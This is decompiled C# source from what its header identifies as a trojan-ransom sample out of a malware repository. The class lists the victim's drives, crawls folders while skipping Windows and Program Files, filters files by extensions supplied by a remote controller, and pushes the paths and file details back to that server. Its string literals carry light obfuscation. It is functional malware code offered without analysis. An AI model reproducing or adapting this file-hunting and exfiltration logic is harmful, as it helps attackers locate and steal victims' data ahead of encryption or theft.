// Decompiled with JetBrains decompiler
// Type: ravighruam.ravighruamDRIVF
// Assembly: ravighruam, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74F3FC03-D32B-42A6-BF5E-9A04C10FC1EF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-3a2d8137283ea060941c3dcbaf2f82ab42ec93af7866b1de1b42f59df23d6f6e.exe

using System;
using System.Collections.Generic;
using System.IO;

namespace ravighruam
{
  internal class ravighruamDRIVF
  {
    public List<string> ravighruamnotFilders = new List<string>();
    public string ravighruammainPath;
    public int ravighruamsIndx = 0;
    public List<string> ravighruamsFiles = new List<string>();
    public string ravighruamfilesLogs = ravighruamCONF.ravighruamfilesLogs;
    public int ravighruamfIndx = 0;
    public bool ravighruamreaging = false;
    public ravighruamMCDM iserver;
    public List<string> ravighruamfExts = new List<string>();

    public bool ravighruamseeAccess(string fPath)
    {
      DirectoryInfo directoryInfo = new DirectoryInfo(fPath);
      try
      {
        directoryInfo.GetDirectories();
        return true;
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public ravighruamDRIVF()
    {
      this.ravighruamnotFilders.Add("clients_data|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("program files|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("system volume information|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("$recycle.bin|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("msocache|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("recoveDSDF|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("documents and settings|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("windows|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("program files (x86)|ravighruam".Split('|')[0]);
      this.ravighruamnotFilders.Add("programdata|ravighruam".Split('|')[0]);
    }

    public IEnumerable<string> ravighruamaddFiles(string path)
    {
      Queue<string> moreFiles = new Queue<string>();
      moreFiles.Enqueue(path);
      while (moreFiles.Count > 0 && !this.iserver.ravighruamautCnls)
      {
        path = moreFiles.Dequeue();
        try
        {
          foreach (string directory in Directory.GetDirectories(path))
          {
            if (this.ravighruamseeAccess(directory) && !this.ravighruamnotFilders.Contains(directory.ToLower()))
              moreFiles.Enqueue(directory);
          }
        }
        catch
        {
        }
        string[] files = Directory.GetFiles(path);
        if (files != null)
        {
          for (int i = 0; i < files.Length; ++i)
            yield return files[i];
        }
      }
    }

    public void ravighruamlookFiles(string tempStr)
    {
      this.iserver.ravighruamautCnls = false;
      this.ravighruamfExts.Clear();
      this.ravighruamsFiles.Clear();
      this.ravighruamfIndx = 0;
      this.ravighruamsIndx = 0;
      string[] strArray = tempStr.Split('<');
      if (strArray.Length <= 1)
        return;
      string str1 = strArray[0];
      char[] chArray = new char[1]{ '>' };
      foreach (string str2 in str1.Split(chArray))
      {
        if (str2 != "")
          this.ravighruamfExts.Add(str2);
      }
      if (strArray[1] != "")
      {
        this.ravighruamreaging = true;
        this.ravighruamsendSearch(strArray[1]);
        this.ravighruamreaging = false;
        this.iserver.ravighruampush_data((byte[]) null, "himgzs-seard=searched|ravighruam".Split('|')[0]);
      }
    }

    public string ravighruamcheckFolders(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string directory in Directory.GetDirectories(path))
        {
          if (this.ravighruamseeAccess(directory))
            str = str + directory + ">|ravighruam".Split('|')[0];
        }
      }
      return str;
    }

    public void ravighruamsendSearch(string path)
    {
      try
      {
        foreach (string ravighruamaddFile in this.ravighruamaddFiles(path))
        {
          int startIndex = ravighruamaddFile.LastIndexOf(".");
          if (startIndex < 0)
            startIndex = 0;
          if (this.ravighruamfExts.Contains(ravighruamaddFile.Substring(startIndex).ToLower()))
          {
            string str = this.iserver.ravighruamfile_info(ravighruamaddFile, true);
            this.iserver.ravighruampush_data((byte[]) null, "himgzs-searf=|ravighruam".Split('|')[0] + ravighruamaddFile + "<FILE_AUTO<|ravighruam".Split('|')[0] + str);
          }
          if (this.iserver.ravighruamautCnls)
            break;
        }
      }
      catch
      {
      }
    }

    public string ravighruamlookupFiles(string path)
    {
      string str = "";
      if (Directory.Exists(path))
      {
        foreach (string file in Directory.GetFiles(path))
          str = str + file + ">|ravighruam".Split('|')[0];
      }
      return str;
    }

    public string ravighruamlookupDrives()
    {
      string str = "";
      foreach (DriveInfo drive in DriveInfo.GetDrives())
      {
        if (drive.IsReady)
          str = str + drive.Name + ">|ravighruam".Split('|')[0];
      }
      return str;
    }
  }
}
